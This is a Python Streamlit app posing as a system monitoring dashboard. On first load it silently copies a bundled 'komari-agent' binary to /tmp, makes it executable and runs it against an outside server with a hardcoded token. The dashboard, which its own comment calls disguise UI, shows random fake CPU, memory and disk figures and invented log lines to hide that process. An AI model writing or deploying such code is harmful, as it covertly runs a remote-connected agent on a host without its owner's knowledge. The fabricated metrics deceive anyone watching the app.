import streamlit as st
import subprocess
import os
import shutil
import random
import time

st.set_page_config(page_title="System Monitor", layout="wide")

# ===== 启动 Komari Agent（只执行一次）=====
LOCK_FILE = "/tmp/agent.lock"
SRC = "./komari-agent"
DST = "/tmp/komari-agent"

if not os.path.exists(LOCK_FILE):
    try:
        open(LOCK_FILE, "w").close()

        if os.path.exists(DST):
            os.remove(DST)

        shutil.copy(SRC, DST)
        os.chmod(DST, 0o755)

        subprocess.Popen([
            DST,
            "-e", "https://agent.0-5.art",
            "-t", "YR3y8NXdWH7FkUbuzgiy6c"
        ])
    except Exception as e:
        st.write("Agent error:", e)

# ===== 下面是伪装 UI =====

st.title("📊 System Monitoring Dashboard")

st.sidebar.title("Settings")
refresh_rate = st.sidebar.slider("Refresh Interval (sec)", 1, 10, 3)

# 用假数据更稳（不依赖 psutil）
cpu = random.uniform(10, 60)
mem = random.uniform(20, 70)
disk = random.uniform(30, 80)

col1, col2, col3 = st.columns(3)

col1.metric("CPU Usage", f"{cpu:.1f}%")
col2.metric("Memory Usage", f"{mem:.1f}%")
col3.metric("Disk Usage", f"{disk:.1f}%")

st.subheader("Recent Logs")

logs = [
    "Service started successfully",
    "Heartbeat OK",
    "No anomalies detected",
    "Sync completed",
]

for _ in range(5):
    st.write(f"[{time.strftime('%H:%M:%S')}] {random.choice(logs)}")

st.caption("Last updated: " + time.ctime())

time.sleep(refresh_rate)
st.rerun()
